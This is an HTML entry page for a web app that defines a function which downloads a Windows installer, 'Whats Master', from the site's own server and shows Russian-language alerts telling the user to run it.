<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Hello world project</title>

    <!-- UA Parser for browser detection -->
    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>

    <!-- ClickOnce deployment function -->
    <script>
      function startDownload() {
        const baseUrl = window.location.origin;
        const exeUrl = `${baseUrl}/deploy/Whats Master-v9.1.0-win-x64.exe`;
        const uap = new UAParser();
        const browserName = uap.getResult().browser.name;

        console.log("Starting download, browser:", browserName);
        console.log("Download URL:", exeUrl);

        // Show notification
        alert("Начинается скачивание приложения Whats Master (79 MB)...");

        // Create download link
        const link = document.createElement("a");
        link.href = exeUrl;
        link.download = "Whats Master-v9.1.0-win-x64.exe";
        link.style.display = "none";

        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        console.log("Download started");

        // Show follow-up instructions
        setTimeout(() => {
          alert(
            "Скачивание началось! После завершения запустите скачанный файл для установки приложения.",
          );
        }, 1000);
      }

      // Make function globally available
      window.startDownload = startDownload;
    </script>
  </head>

  <body>
    <div id="root"></div>

    <script type="module" src="/client/App.tsx"></script>
  </body>
</html>
